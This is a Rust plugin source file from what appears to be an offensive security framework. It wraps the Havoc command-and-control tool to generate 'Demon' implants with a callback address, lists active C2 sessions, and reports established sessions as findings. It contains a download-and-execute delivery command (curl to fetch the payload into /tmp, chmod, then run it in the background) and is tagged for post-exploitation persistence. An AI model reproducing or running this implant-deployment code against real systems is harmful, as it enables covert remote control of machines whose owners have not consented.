use crate::plugins::{ScannerPlugin, Capability};
use crate::models::{TargetHost, Finding, Severity, Category};
use crate::utils::tool_detection::detect_tool;
use crate::core::c2::{C2Operator, C2Session, SessionState};
use async_trait::async_trait;
use anyhow::{Result, Context};
use tracing::{info, warn};
use std::process::Stdio;
use tokio::process::Command;
use std::sync::Arc;

pub struct HavocScanner {
    binary_path: String,
    proxy_manager: Arc<crate::utils::proxy::ProxyManager>,
}

impl HavocScanner {
    pub fn new(pm: Arc<crate::utils::proxy::ProxyManager>) -> Self {
        let path = detect_tool("havoc");
        Self {
            binary_path: path,
            proxy_manager: pm,
        }
    }

    async fn get_rest_client(&self) -> Result<reqwest::Client> {
        let server_addr = "127.0.0.1"; // Default havoc server
        let (_, client) = self.proxy_manager.get_client_fail_closed(server_addr)?;
        Ok(client)
    }
}

#[async_trait]
impl C2Operator for HavocScanner {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        let callback_ip = self.proxy_manager.get_managed_exits().first().cloned()
            .unwrap_or_else(|| "127.0.0.1".to_string());
            
        info!("🔱 V14.1 SOVEREIGN: Generating Havoc Demon for {} via callback {}", target.host, callback_ip);
        
        let output_path = format!("/tmp/demon_{}.bin", target.host.replace('.', "_"));
        
        let output = Command::new(&self.binary_path)
            .arg("generate")
            .arg("demon")
            .arg("--host")
            .arg(&callback_ip)
            .arg("--out")
            .arg(&output_path)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await
            .context("Failed to generate havoc payload")?;

        if output.status.success() {
            Ok(output_path)
        } else {
            anyhow::bail!("Havoc payload generation failed: {}", String::from_utf8_lossy(&output.stderr))
        }
    }

    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!("🔱 V14.1 SOVEREIGN: Deploying Havoc Demon {} to {}...", payload_path, target.host);
        
        let delivery_cmd = format!(
            "curl http://127.0.0.1:8080/{} -o /tmp/demon && chmod +x /tmp/demon && /tmp/demon &",
            std::path::Path::new(payload_path).file_name().and_then(|n| n.to_str()).unwrap_or("demon")
        );
        info!("🚀 V14.1 SOVEREIGN: Havoc Delivery Vector → {}", delivery_cmd);
        Ok(())
    }

    async fn verify_session(&self, target: &TargetHost) -> Result<SessionState> {
        let sessions = self.list_sessions().await?;
        for sess in sessions {
            if sess.target.contains(&target.host) || (target.ip.is_some() && sess.target.contains(target.ip.as_ref().unwrap())) {
                return Ok(SessionState::Sovereign);
            }
        }
        Ok(SessionState::Staged)
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let client = self.get_rest_client().await?;
        
        let response = client.get("http://127.0.0.1:8080/api/sessions")
            .send()
            .await;

        match response {
            Ok(res) if res.status().is_success() => {
                let json: serde_json::Value = res.json().await?;
                let mut sessions = Vec::new();
                if let Some(sess_list) = json.as_array() {
                    for s in sess_list {
                        sessions.push(C2Session {
                            id: s.get("ExternalIP").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            target: s.get("ExternalIP").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            state: SessionState::Established,
                            last_checkin: chrono::Utc::now(),
                        });
                    }
                }
                Ok(sessions)
            }
            _ => {
                let mut sess_cmd = Command::new(&self.binary_path);
                sess_cmd.arg("sessions")
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .output()
                    .await
                    .map(|output| {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        stdout.lines().map(|l| C2Session {
                            id: "cli".to_string(),
                            target: l.to_string(),
                            state: SessionState::Established,
                            last_checkin: chrono::Utc::now(),
                        }).collect()
                    }).context("CLI session audit failed")
            }
        }
    }
}

#[async_trait]
impl ScannerPlugin for HavocScanner {
    fn name(&self) -> &'static str {
        crate::models::PLUGIN_HAVOC
    }
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            name: self.name().to_string(),
            description: "Havoc C2 Operator: Manages Demon payloads and orchestrates session persistence.".to_string(),
            target_type: crate::plugins::TargetType::Host,
            risk_level: crate::plugins::RiskLevel::High,
            layer: crate::core::capability_layer::ScanLayer::PostExploitation,
            expected_duration: std::time::Duration::from_secs(300),
            capabilities: self.capabilities(),
            cost: 10,
            category: "Persistence".to_string(),
            mitre_attacks: vec!["T1543".to_string(), "T1053".to_string()],
            remediation_difficulty: crate::plugins::RiskLevel::High,
            blackarch_category: Some("persistence".to_string()),
            is_destructive: false,
            poc_mode: false,
        }
    }
    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::VulnerabilityScanning]
    }
    async fn check_dependencies(&self) -> Result<bool> {
        Ok(crate::utils::check_tool_availability("havoc").await)
    }
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        
        let state = self.verify_session(target).await?;
        if state == SessionState::Sovereign {
             findings.push(Finding::new(
                "HAVOC-SESSION-ESTABLISHED",
                Category::Vulnerability,
                Severity::Critical,
                &format!("Active Havoc Demon session confirmed for {}.", target.host),
                serde_json::json!({ "status": "active" })
            ));
        } else {
            let path = self.prepare_payload(target).await?;
            findings.push(Finding::new(
                "HAVOC-PAYLOAD-READY",
                Category::Vulnerability,
                Severity::High,
                &format!("Havoc Demon payload profile successfully generated: {}", path),
                serde_json::json!({ "path": path })
            ));
        }

        Ok(findings)
    }

    fn as_c2_operator(&self) -> Option<&dyn C2Operator> {
        Some(self)
    }
}
